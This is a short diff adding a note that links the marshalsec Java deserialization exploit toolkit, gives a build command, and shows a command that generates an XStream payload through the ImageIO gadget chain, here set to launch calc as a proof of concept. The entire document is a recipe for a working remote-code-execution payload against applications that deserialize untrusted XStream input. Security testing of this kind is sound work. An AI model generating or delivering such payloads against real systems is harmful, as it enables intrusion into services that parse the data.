@@ -1,0 +1,5 @@
+https://github.com/mbechler/marshalsec
+
+mvn clean package -Dmaven.test.skip=true install
+
+java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc > 1.txt
